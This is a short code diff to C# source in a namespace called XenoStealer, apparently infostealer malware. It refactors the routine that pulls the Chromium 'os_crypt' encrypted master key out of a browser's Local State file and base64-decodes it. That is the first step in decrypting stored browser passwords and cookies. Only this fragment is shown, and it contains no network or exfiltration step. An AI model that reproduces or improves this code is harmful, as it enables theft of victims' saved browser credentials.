@@ -43,9 +43,13 @@ namespace XenoStealer
             try
             {
                 dynamic jsonObject = serializer.Deserialize<dynamic>(content);
-                if (jsonObject != null && jsonObject.ContainsKey("os_crypt") && jsonObject["os_crypt"].ContainsKey("encrypted_key"))
+                if (jsonObject != null)
                 {
-                    string encryptedKeyBase64 = jsonObject["os_crypt"]["encrypted_key"];
+                    string encryptedKeyBase64 = jsonObject?["os_crypt"]?["encrypted_key"];
+                    if (encryptedKeyBase64 == null) 
+                    {
+                        return null;
+                    }
                     byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
 
                     byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 5, encryptedKey.Length - 5));
